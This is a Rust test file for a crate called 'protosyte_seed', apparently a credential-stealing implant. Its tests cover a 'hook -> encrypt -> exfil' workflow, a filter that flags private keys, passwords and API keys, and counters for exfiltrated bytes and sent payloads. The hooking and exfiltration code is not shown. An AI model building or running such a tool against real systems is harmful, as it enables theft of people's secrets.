#[cfg(test)]
mod tests {
    use protosyte_seed::*;
    use std::sync::Arc;
    use tokio::sync::mpsc;
    
    #[tokio::test]
    async fn test_crypto_encrypt_decrypt() {
        let crypto = crypto::CryptoManager::new();
        let data = b"test data";
        
        let encrypted = crypto.encrypt(data).await;
        assert!(!encrypted.is_empty());
        
        let decrypted = crypto.decrypt(&encrypted).unwrap();
        assert_eq!(decrypted, data);
    }
    
    #[tokio::test]
    async fn test_hmac_computation() {
        let crypto = crypto::CryptoManager::new();
        let data = b"test data";
        
        let hmac1 = crypto.compute_hmac(data);
        let hmac2 = crypto.compute_hmac(data);
        
        assert_eq!(hmac1, hmac2);
        assert!(!hmac1.is_empty());
    }
    
    #[tokio::test]
    async fn test_full_workflow() {
        // Test the full workflow: hook -> encrypt -> exfil
        let crypto = Arc::new(crypto::CryptoManager::new());
        let hook_manager = hook::HookManager::new();
        let (tx, mut rx) = mpsc::unbounded_channel();
        
        // Simulate data capture
        let test_data = b"password=secret123";
        if let Some(filtered) = hook_manager.filter_data(test_data) {
            let _ = tx.send(filtered);
        }
        
        // Encrypt the data
        if let Some(data) = rx.recv().await {
            let encrypted = crypto.encrypt(&data).await;
            assert!(!encrypted.is_empty());
            
            // Decrypt and verify
            let decrypted = crypto.decrypt(&encrypted).unwrap();
            assert_eq!(decrypted, test_data);
        }
    }
    
    #[tokio::test]
    async fn test_error_handling_workflow() {
        // Test error handling in the workflow
        let crypto = Arc::new(crypto::CryptoManager::new());
        
        // Test invalid ciphertext
        let invalid = b"too short";
        assert!(crypto.decrypt(invalid).is_err());
        
        // Test valid encryption/decryption
        let data = b"valid data";
        let encrypted = crypto.encrypt(data).await;
        let decrypted = crypto.decrypt(&encrypted).unwrap();
        assert_eq!(decrypted, data);
    }
    
    #[test]
    fn test_hook_filter_integration() {
        let manager = hook::HookManager::new();
        
        // Test various data types
        let test_cases = vec![
            (b"-----BEGIN RSA PRIVATE KEY-----", true),
            (b"password=secret", true),
            (b"api_key=sk_live_1234567890", true),
            (b"normal text", false),
        ];
        
        for (data, should_match) in test_cases {
            let result = manager.filter_data(data);
            if should_match {
                assert!(result.is_some(), "Expected match for: {:?}", data);
            } else {
                assert!(result.is_none(), "Expected no match for: {:?}", data);
            }
        }
    }
    
    #[test]
    fn test_buffer_operations() {
        let buffer = buffer::RingBuffer::new(1024);
        
        // Write and read
        let data = b"test data";
        assert!(buffer.write(data).is_ok());
        
        let read_data = buffer.read(data.len());
        assert!(read_data.is_some());
        assert_eq!(read_data.unwrap(), data);
    }
    
    #[tokio::test]
    async fn test_metrics_integration() {
        use protosyte_seed::logging::Metrics;
        
        let metrics = Metrics::new();
        
        // Increment various metrics
        metrics.increment_payloads_sent();
        metrics.add_bytes_exfiltrated(1024);
        metrics.set_hooks_active(5);
        
        let stats = metrics.get_stats();
        assert_eq!(stats.payloads_sent, 1);
        assert_eq!(stats.bytes_exfiltrated, 1024);
        assert_eq!(stats.hooks_active, 5);
    }
}
